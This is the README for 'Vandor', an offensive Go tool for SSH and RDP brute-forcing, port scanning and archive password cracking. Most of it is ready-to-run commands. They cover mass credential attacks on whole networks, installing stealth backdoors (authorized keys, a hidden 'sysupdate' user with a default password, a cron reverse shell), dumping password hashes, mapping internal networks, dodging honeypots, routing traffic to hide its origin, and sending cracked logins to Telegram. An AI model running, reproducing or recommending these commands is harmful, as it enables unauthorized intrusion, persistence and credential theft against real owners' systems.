# Vandor - SSH/RDP BruteForce

<div align="center">

[![License](https://img.shields.io/badge/license-MIT-red.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?logo=go)](https://golang.org)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/batmanpriv/Vandor)

**SSH & RDP BruteForcer | Port Scanner | Archive Password Recovery | Post-Exploitation**

</div>

---

## 🔍 Overview

**Vandor** is a command-line security testing tool written in Go for:

- **SSH brute-force** with custom wordlists and attack modes
- **RDP brute-force** with NLA support
- **Port scanning** with configurable threads and timeout
- **Alive host checking** (TCP connect)
- **RAR/ZIP archive password recovery**
- **Honeypot detection** to avoid fake services
- **Post-exploitation** (backdoor, hash dump, network scan)
- **Telegram notifications** for real-time alerts
- **Checkpoint resume** for interrupted attacks
- **Configurable performance** (threads, timeouts)

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| **SSH Cracking** | Brute force SSH with custom wordlists |
| **RDP Cracking** | Brute force RDP with NLA support |
| **Port Scanner** | Scan single, multiple, or range of ports |
| **Alive Check** | Check if hosts are reachable via TCP |
| **Attack Modes** | normal, null, userpass, reverse |
| **Mass Pwn** | All hosts × all users × all passwords |
| **Smart Pass** | Generate passwords based on usernames |
| **Honeypot Detection** | Identify fake services |
| **Post-Exploitation** | Backdoor, persistence, hash dump |
| **Telegram Alerts** | Real-time notifications on cracks |
| **Resume Support** | Continue from checkpoint |
| **Configurable Performance** | Adjust threads and timeouts |

---

## 📥 Installation

```bash
# Install directly
go install -ldflags="-s -w" github.com/batmanpriv/Vandor@latest

# Or build from source
git clone https://github.com/batmanpriv/Vandor.git
cd Vandor
go mod tidy
go build -ldflags="-s -w" -o Vandor main.go
```

---

## 🚀 Quick Start

### Port Scanning

```bash
# Scan specific ports
Vandor -targets 192.168.1.1 -ps 22,80,443

# Scan with default ports (22,3389)
Vandor -targets 192.168.1.0/24 -ps

# Scan port range
Vandor -targets 192.168.1.1 -ps 20-100

# Fast port scan with custom threads
Vandor -targets 192.168.1.0/24 -ps 22,80,443 -ps-threads 5000 -ps-timeout 50
```

### Alive Host Check

```bash
# Check if hosts are alive
Vandor -targets 192.168.1.0/24 -alive

# Check on custom port
Vandor -targets 192.168.1.0/24 -alive -port 80
```

### SSH Cracking

```bash
# Basic SSH attack
Vandor -targets 192.168.1.100 -users root -passwords admin123

# SSH with wordlists
Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt

# Fast SSH cracking with custom threads
Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt -crack-threads 10000 -crack-timeout 5

# CIDR network
Vandor -targets 192.168.1.0/24 -users admin -passwords admin123

# Custom SSH port
Vandor -targets 10.0.0.5:2222 -users root -passwords pass.txt
```

### RDP Cracking

```bash
# RDP attack
Vandor -targets 10.0.0.5 -protocol rdp -users admin -passwords pass.txt

# Fast RDP cracking
Vandor -targets hosts.txt -users admin -passwords pass.txt -protocol rdp -crack-threads 8000 -crack-timeout 8
```

### Archive Cracking

```bash
# Crack RAR file
Vandor -rar archive.rar -rar-dict rockyou.txt

# Crack ZIP file
Vandor -zip archive.zip -zip-dict rockyou.txt
```

### Post-Exploitation

```bash
# With backdoor installation
Vandor -targets 10.0.0.5 -users root -passwords pass.txt -backdoor -backdoor-type ssh-key

# All backdoor types
Vandor -targets 10.0.0.5 -users root -passwords pass.txt -backdoor -backdoor-type all

# Gather system info
Vandor -targets 10.0.0.5 -users root -passwords pass.txt -post-exploit

# Extract password hashes
Vandor -targets 10.0.0.5 -users root -passwords pass.txt -extract-hash
```

### Telegram Notifications

```bash
Vandor -targets targets.txt -users users.txt -passwords pass.txt -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
```

---

## 📚 CLI Flags Reference

### Required Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-targets, -t` | IP, CIDR, or hosts file | `-targets 192.168.1.1` |
| `-users, -u` | Username or users file | `-users root` |
| `-passwords, -p` | Password or passwords file | `-passwords admin123` |

### Protocol Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-protocol, -proto` | ssh or rdp | ssh |
| `-port, -P` | Custom port | 22/3389 |

### Port Scanner Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-ps` | Ports to scan (comma or range) | 22,3389 |
| `-ps-threads` | Threads for port scan (max: 20000) | 2000 |
| `-ps-timeout` | Timeout in milliseconds | 100 |
| `-alive` | Check if hosts are alive | false |

### Performance Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-crack-threads` | Threads for cracking (max: 20000) | 5000 |
| `-crack-timeout` | Timeout in seconds for cracking | 10 |
| `-threads, -th` | Concurrent threads (general) | 5000 |
| `-timeout, -to` | Connection timeout in seconds | 5 |

### Attack Mode Flags

| Flag | Description |
|------|-------------|
| `-attack-mode` | normal, null, userpass, reverse |
| `-mass-pwn` | All hosts × all users × all passwords |
| `-smart-pass` | Generate smart passwords from usernames |
| `-creds, -c` | Credentials file (user:pass format) |

### Scanner Flags

| Flag | Description |
|------|-------------|
| `-skip-alive` | Skip alive check |
| `-resume` | Resume from checkpoint |
| `-honeypot` | Detect honeypots before attacking |

### Post-Exploitation Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-backdoor` | Install backdoor after cracking | false |
| `-backdoor-type` | ssh-key, hidden-user, reverse-shell, sshd-port, all | ssh-key |
| `-backdoor-port` | Port for backdoor | 22222 |
| `-backdoor-user` | Hidden username | sysupdate |
| `-backdoor-pass` | Password for hidden user | P@ssw0rd123! |
| `-post-exploit` | Gather system information | false |
| `-extract-hash` | Extract password hashes | false |
| `-scan-network` | Scan internal network after access | false |
| `-gen-script` | Generate auto-login script | false |

### Telegram Flags

| Flag | Description |
|------|-------------|
| `-bot-token` | Telegram bot token |
| `-chat-id` | Telegram chat ID |
| `-notify, -not` | 0=off, 1=on crack, 2=on completion |

### Output Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-json` | Export JSON results | true |
| `-csv` | Export CSV results | false |
| `-monitor` | Real-time monitoring | false |

### Archive Cracker Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-rar` | RAR file to crack | |
| `-rar-dict` | Password dictionary for RAR | |
| `-rar-workers` | Number of workers | CPU*2 |
| `-rar-buffer` | Buffer size | 10000 |
| `-zip` | ZIP file to crack | |
| `-zip-dict` | Password dictionary for ZIP | |
| `-zip-workers` | Number of workers | CPU*2 |
| `-zip-buffer` | Buffer size | 10000 |

### Other Flags

| Flag | Description |
|------|-------------|
| `-multi-city` | Route through multiple cities |
| `-help` | Show help message |
| `-example` | Show examples |

---

## ⚔️ Attack Modes

### Normal Mode (Default)
Standard dictionary attack.

```bash
Vandor -targets host.txt -users users.txt -passwords pass.txt -attack-mode normal
```

### Null Mode
Try empty password.

```bash
Vandor -targets 10.0.0.5 -users root -attack-mode null
```

### UserAsPass Mode
Password equals username.

```bash
Vandor -targets 10.0.0.5 -users admin -attack-mode userpass
```

### Reverse Mode
Password equals reversed username.

```bash
Vandor -targets 10.0.0.5 -users admin -attack-mode reverse
```

### Mass PWN Mode
All combinations simultaneously.

```bash
Vandor -targets hosts.txt -users users.txt -passwords pass.txt -mass-pwn
```

---

## 🍯 Honeypot Detection

```bash
Vandor -targets suspicious.net -users test -passwords test123 -honeypot
```

Detects honeypots using:
- Banner signatures (cowrie, kippo, honeypot, etc.)
- Protocol mismatch testing
- Response time analysis
- Banner consistency checks
- TCP timestamp analysis
- Known honeypot IP database

---

## 📦 Archive Cracker

### RAR

```bash
Vandor -rar archive.rar -rar-dict rockyou.txt
Vandor -rar secret.rar -rar-dict passwords.txt -rar-workers 2000
```

### ZIP

```bash
Vandor -zip backup.zip -zip-dict rockyou.txt
Vandor -zip protected.zip -zip-dict rockyou.txt -zip-workers 1000
```

---

## 🐚 Post-Exploitation

### Backdoor Types

| Type | Description |
|------|-------------|
| `ssh-key` | Install SSH authorized_key (most stealthy) |
| `hidden-user` | Create hidden system user |
| `reverse-shell` | Cron-based reverse shell callback |
| `sshd-port` | Open alternative SSH port |
| `all` | Deploy all backdoor types |

### Examples

```bash
# SSH Key Backdoor (Most Stealthy)
Vandor -targets target.com -users root -passwords pass.txt -backdoor -backdoor-type ssh-key

# Hidden User Backdoor
Vandor -targets target.com -users root -passwords pass.txt -backdoor -backdoor-type hidden-user -backdoor-user sysupdate -backdoor-pass "P@ssw0rd123!"

# Deploy Everything
Vandor -targets target.com -users root -passwords pass.txt -backdoor -backdoor-type all -backdoor-port 22222
```

---

## 📱 Telegram Notifications

```bash
Vandor -targets targets.txt -users users.txt -passwords pass.txt -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
```

| Mode | Description |
|------|-------------|
| `-notify 0` | No notifications |
| `-notify 1` | Notify on each crack |
| `-notify 2` | Notify on completion |

---

## 📁 Output Files

| File | Description |
|------|-------------|
| `LIVE.txt` | Alive hosts |
| `open_ports.txt` | Discovered open ports |
| `Cracked.txt` | All cracked credentials |
| `results.json` | Full attack statistics |
| `results.csv` | Credentials in CSV format |
| `checkpoint.json` | Resume information |
| `postexploit_*.json` | System information |
| `hashes_*.txt` | Password hashes |
| `internal_network.txt` | Discovered internal hosts |
| `auto_login.sh` | Auto-login script |

---

## ⚡ Performance Optimization

### Port Scanner

| Setting | Speed | Recommended for |
|---------|-------|-----------------|
| `-ps-threads 2000 -ps-timeout 100` | Normal (default) | General use |
| `-ps-threads 5000 -ps-timeout 50` | Fast | Local networks |
| `-ps-threads 10000 -ps-timeout 30` | Very Fast | /24 networks |
| `-ps-threads 20000 -ps-timeout 20` | Ultra Fast | Large networks |

### Cracking

| Setting | Speed | Recommended for |
|---------|-------|-----------------|
| `-crack-threads 5000 -crack-timeout 10` | Normal (default) | General use |
| `-crack-threads 10000 -crack-timeout 5` | Fast | Local networks |
| `-crack-threads 15000 -crack-timeout 3` | Very Fast | LAN / trusted networks |
| `-crack-threads 20000 -crack-timeout 2` | Ultra Fast | High-end hardware |

### Examples

```bash
# Fast port scan + fast cracking
Vandor -targets 192.168.1.0/24 -ps 22,3389 -ps-threads 10000 -ps-timeout 30 -users root -passwords rockyou.txt -crack-threads 15000 -crack-timeout 5

# Ultra fast for local network
Vandor -targets 192.168.1.0/24 -ps -ps-threads 20000 -ps-timeout 20 -users users.txt -passwords pass.txt -crack-threads 20000 -crack-timeout 3

# Conservative for internet targets
Vandor -targets targets.txt -users users.txt -passwords pass.txt -crack-threads 5000 -crack-timeout 15
```

---

## 📝 Complete Examples

### Single IP Scans

```bash
# Port scan single IP
Vandor -targets 192.168.1.1 -ps

# Port scan single IP with specific ports
Vandor -targets 192.168.1.1 -ps 22,80,443,8080

# Port scan single IP with range
Vandor -targets 192.168.1.1 -ps 20-100

# Alive check single IP
Vandor -targets 192.168.1.1 -alive

# SSH crack single IP
Vandor -targets 192.168.1.1 -users root -passwords admin123

# SSH crack single IP with custom port
Vandor -targets 192.168.1.1:2222 -users root -passwords pass.txt

# RDP crack single IP
Vandor -targets 192.168.1.1 -protocol rdp -users admin -passwords pass.txt

# RDP crack single IP with custom port
Vandor -targets 192.168.1.1:3389 -protocol rdp -users admin -passwords pass.txt
```

### CIDR Network Scans

```bash
# Port scan CIDR
Vandor -targets 192.168.1.0/24 -ps

# Port scan CIDR with specific ports
Vandor -targets 192.168.1.0/24 -ps 22,80,443

# Alive check CIDR
Vandor -targets 192.168.1.0/24 -alive

# SSH crack CIDR
Vandor -targets 192.168.1.0/24 -users root -passwords pass.txt

# SSH crack CIDR with wordlists
Vandor -targets 192.168.1.0/24 -users users.txt -passwords rockyou.txt

# RDP crack CIDR
Vandor -targets 192.168.1.0/24 -protocol rdp -users admin -passwords pass.txt
```

### File-Based Targets

```bash
# Port scan from file
Vandor -targets hosts.txt -ps

# Alive check from file
Vandor -targets hosts.txt -alive

# SSH crack from file
Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt

# RDP crack from file
Vandor -targets hosts.txt -protocol rdp -users users.txt -passwords pass.txt

# Port scan + SSH crack from files
Vandor -targets hosts.txt -ps 22 -users users.txt -passwords rockyou.txt
```

### Combined Operations

```bash
# Port scan then SSH crack
Vandor -targets 192.168.1.0/24 -ps 22 -users root -passwords admin123

# Alive check then SSH crack
Vandor -targets 192.168.1.0/24 -alive -users root -passwords admin123

# Full workflow: scan, alive check, crack
Vandor -targets 192.168.1.0/24 -ps 22 -alive -users root -passwords pass.txt

# Skip alive check for faster cracking
Vandor -targets targets.txt -users users.txt -passwords pass.txt -skip-alive
```

### Attack Mode Examples

```bash
# Null password attack
Vandor -targets 10.0.0.5 -users root -attack-mode null

# User as password
Vandor -targets 10.0.0.5 -users admin -attack-mode userpass

# Reverse username as password
Vandor -targets 10.0.0.5 -users admin -attack-mode reverse

# Mass pwn (all combinations)
Vandor -targets hosts.txt -users users.txt -passwords pass.txt -mass-pwn

# Smart password generation
Vandor -targets 10.0.0.5 -users root -passwords pass.txt -smart-pass
```

### Credentials File Format

```bash
# Single user:pass format
Vandor -targets 10.0.0.5 -creds credentials.txt

# credentials.txt content:
# root:password123
# admin:admin123
# user:pass

# With protocol
Vandor -targets 10.0.0.5 -protocol ssh -creds credentials.txt
```

### Resume Support

```bash
# First attack (creates checkpoint)
Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt

# Resume after interruption
Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt -resume
```

### Honeypot Detection

```bash
# Enable honeypot detection
Vandor -targets suspicious.net -users test -passwords test123 -honeypot

# With Telegram notifications
Vandor -targets targets.txt -users users.txt -passwords pass.txt \
  -honeypot -bot-token "TOKEN" -chat-id "ID" -notify 1
```

### Post-Exploitation Workflows

```bash
# Full post-exploitation with all features
Vandor -targets target.com -users root -passwords pass.txt -post-exploit -extract-hash -scan-network -gen-script -backdoor -backdoor-type all -bot-token "TOKEN" -chat-id "ID" -notify 1

# Extract hashes only
Vandor -targets target.com -users root -passwords pass.txt -extract-hash

# Network mapping only
Vandor -targets target.com -users root -passwords pass.txt -scan-network

# Generate auto-login script
Vandor -targets target.com -users root -passwords pass.txt -gen-script

# Gather system info
Vandor -targets target.com -users root -passwords pass.txt -post-exploit
```

### Multi-City Routing

```bash
# Route through multiple cities
Vandor -targets target.com -users root -passwords pass.txt -multi-city

# With other features
Vandor -targets target.com -users root -passwords pass.txt -multi-city -post-exploit
```

### Real-Time Monitoring

```bash
# Enable monitoring
Vandor -targets hosts.txt -users users.txt -passwords pass.txt -monitor

# With performance tuning
Vandor -targets hosts.txt -users users.txt -passwords pass.txt -monitor -crack-threads 10000 -crack-timeout 5
```

### JSON/CSV Export

```bash
# JSON export (default)
Vandor -targets host.txt -users users.txt -passwords pass.txt -json

# CSV export
Vandor -targets host.txt -users users.txt -passwords pass.txt -csv

# Both formats
Vandor -targets host.txt -users users.txt -passwords pass.txt -json -csv
```

### Complete Production Example

```bash
# Full attack with all features
Vandor -targets targets.txt \
  -users users.txt \
  -passwords rockyou.txt \
  -protocol ssh \
  -port 22 \
  -crack-threads 10000 \
  -crack-timeout 5 \
  -attack-mode normal \
  -smart-pass \
  -honeypot \
  -backdoor -backdoor-type ssh-key \
  -post-exploit \
  -extract-hash \
  -scan-network \
  -gen-script \
  -monitor \
  -json -csv \
  -bot-token "YOUR_BOT_TOKEN" \
  -chat-id "YOUR_CHAT_ID" \
  -notify 1
```

---

## ❓ FAQ

### Q: How do I stop a running attack?

**A:** Press `Ctrl+C`. Checkpoint saves progress automatically.

### Q: Can I use my own wordlists?

**A:** Yes, any text file with one entry per line. Comment lines start with `#`.

### Q: Can I resume an interrupted attack?

**A:** Yes, use `-resume` flag. Checkpoint saves every 30 seconds.

### Q: What's the maximum password length?

**A:** No practical limit. Go strings support up to 2GB.

### Q: Does Vandor work on Windows?

**A:** Yes, fully supported.

### Q: What's the fastest scanning configuration?

**A:** For local networks: `-ps-threads 20000 -ps-timeout 20 -crack-threads 20000 -crack-timeout 3`

### Q: Can I scan a single port?

**A:** Yes: `Vandor -targets 192.168.1.1 -ps 22`

### Q: Can I scan a range of ports?

**A:** Yes: `Vandor -targets 192.168.1.1 -ps 20-100`

### Q: What's the default port scan?

**A:** `22,3389` (SSH and RDP)

### Q: Can I use credentials file with RDP?

**A:** Yes: `Vandor -targets 10.0.0.5 -protocol rdp -creds creds.txt`

### Q: What if I get "too many open files"?

**A:** Reduce thread count: `-ps-threads 2000` or `-crack-threads 2000`

### Q: Does Vandor support IPv6?

**A:** Yes, IPv6 addresses are supported.

### Q: Can I scan multiple ports at once?

**A:** Yes: `-ps 22,80,443,8080,8443`

---

## 🛠️ Troubleshooting

### Error: "flag provided but not defined: -ps"

**Solution:** Make sure you're using the latest version with port scan support.

### Error: "invalid hosts file"

**Solution:** Check the file path and format. Each line should contain one IP or hostname.

### Error: "connection refused"

**Solution:** The target is not reachable or the service is not running.

### Error: "too many open files"

**Solution:** Reduce thread count: `-ps-threads 2000` or `-crack-threads 2000`

### Error: "no alive hosts"

**Solution:** The hosts are not reachable. Check network connectivity or use `-skip-alive`.

### Error: "invalid CIDR"

**Solution:** Ensure CIDR notation is correct (e.g., 192.168.1.0/24).

### Error: "invalid port spec"

**Solution:** Use comma-separated ports or range (e.g., 22,80,443 or 20-100).

### Error: "protocol not supported"

**Solution:** Use only `ssh` or `rdp` with `-protocol` flag.

### Error: "no users specified"

**Solution:** Use `-users` or `-creds` to provide usernames.

### Error: "no passwords specified"

**Solution:** Use `-passwords` or `-creds` to provide passwords.

### Error: "RAR file not found"

**Solution:** Check the file path and ensure the RAR file exists.

### Error: "ZIP file not found"

**Solution:** Check the file path and ensure the ZIP file exists.

### Error: "failed to read dictionary"

**Solution:** Ensure the dictionary file exists and is readable.

### Error: "SSH connection failed"

**Solution:** Check network connectivity and ensure SSH service is running.

### Error: "RDP connection failed"

**Solution:** Check network connectivity and ensure RDP service is running.
